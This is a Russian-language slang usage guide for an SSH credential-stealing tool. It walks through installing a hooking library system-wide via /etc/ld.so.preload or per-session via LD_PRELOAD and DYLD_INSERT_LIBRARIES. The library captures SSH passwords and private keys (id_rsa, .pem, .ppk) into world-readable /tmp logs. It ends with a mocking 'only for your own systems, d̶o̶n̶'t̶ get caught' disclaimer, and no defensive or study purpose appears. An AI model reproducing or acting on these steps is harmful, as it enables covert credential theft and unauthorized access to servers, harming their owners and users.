КАК ЮЗАТЬ ЭТУ ТЕМУ С ПЕРЕХВАТОМ ПАРОЛЕЙ И КЛЮЧЕЙ SSH

Короче, тема такая. Эта прога палит пароли и ключи от SSH. Всё просто:

1) ЕСЛИ УСТАНАВЛИВАЕШЬ НА ЛИНУКС:
   * Сперва забей все файлы из архива куда-нить
   * Потом зайди туда через терминал: cd путь/до/файлов
   * Сделай скрипты исполняемыми: chmod +x *.sh
   * Запусти адаптер: ./mac_linux_adapter.sh
     (он просто настроит всё под твою систему, ниче сложного)

2) БЫСТРАЯ УСТАНОВКА (ДЛЯ РЕАЛЬНЫХ ПАЦАНОВ):
   * Запусти установщик с правами суперюзера: sudo ./installer.sh
   * Когда спросят про автозагрузку через /etc/ld.so.preload, жми "y"
   * Всё, теперь прога автоматом будет перехватывать пароли и ключи от всех SSH-соединений

3) РУЧНАЯ ТЕМА (ДЛЯ ПАРАНОИКОВ):
   * Скомпиль либу: sudo ./compile.sh
   * Кода спросят куда ставить, выбери "2" (оставить локально)
   * Потом юзай так: LD_PRELOAD=./libssh_inject.so ssh юзер@сервер
   * Пароли будут в файле /tmp/ssh_inj.dbg
   * Ключи будут в файле /tmp/ssh_keys.log

4) КАК ПОСМОТРЕТЬ ЧО НАПАЛИЛИ:
   * Для паролей: cat /tmp/ssh_inj.dbg
   * Для ключей: cat /tmp/ssh_keys.log
   * Там будет всё: кто вводил, когда, с какого компа, какие ключи юзал

5) ЧТО УМЕЕТ ПЕРЕХВАТЫВАТЬ:
   * Пароли при вводе в SSH-клиенте
   * Приватные SSH-ключи (id_rsa, id_dsa и т.д.)
   * PEM-ключи (.pem, .key)
   * Ключи в формате PuTTY (.ppk)
   * Файлы authorized_keys и known_hosts
   * Работает со всеми программами, которые используют SSH

6) КАК УБРАТЬ ЭТУ ХРЕНЬ ИЗ СИСТЕМЫ:
   * sudo ./uninstall.sh
   * На вопрос удалять ли логи отвечай как сам хочешь

ЧО ДЕЛАТЬ НА МАКЕ:
Всё то же самое, только:
   * Вместо LD_PRELOAD=./libssh_inject.so используй DYLD_INSERT_LIBRARIES=./libssh_inject.dylib
   * И компилятор другой: clang++ вместо g++
   * Адаптер всё настроит, не загоняйся

ВАЖНО:
   * Прога пишет данные в открытые файлы /tmp/ssh_inj.dbg и /tmp/ssh_keys.log
   * Любой юзер на системе может их прочитать
   * Ключи — это серьезно, с ними можно зайти на сервера без пароля
   * Если используешь для реальных дел - не забудь убрать либу после использования
   * Не юзай на чужих системах без разрешения, статья светит

ЧО ДЕЛАТЬ ЕСЛИ ОШИБКИ:
   * Если вылетает ошибка компиляции - проверь что есть g++ и либа libdl
   * Если не перехватывает пароли - проверь, что SSH реально использует пароли, а не ключи
   * Если не перехватывает ключи - проверь права доступа к файлам ключей
   * Если всё по нулям - глянь лог: dmesg | grep ssh

КАК НАСТРОИТЬ СЕРВЕР НА АУТЕНТИФИКАЦИЮ ПО КЛЮЧУ:
1) Сгенерить пару ключей:
   * ssh-keygen -t rsa -b 4096
   * Они будут в ~/.ssh/id_rsa (приватный) и ~/.ssh/id_rsa.pub (публичный)

2) Закинуть публичный ключ на сервер:
   * ssh-copy-id user@server
   ИЛИ
   * cat ~/.ssh/id_rsa.pub | ssh user@server "mkdir -p ~/.ssh && chmod 700 ~/.ssh && cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"

3) Проверить, что работает:
   * ssh user@server
   * Должно зайти без пароля
   * А наша прога должна перехватить ключ!

НАСЛАЖДАЙСЯ ТЕМОЙ!
ТОЛЬКО ДЛЯ ТЕСТИРОВАНИЯ СВОИХ СИСТЕМ, Н̶Е̶ ̶П̶А̶Л̶И̶Т̶Ь̶С̶Я̶! 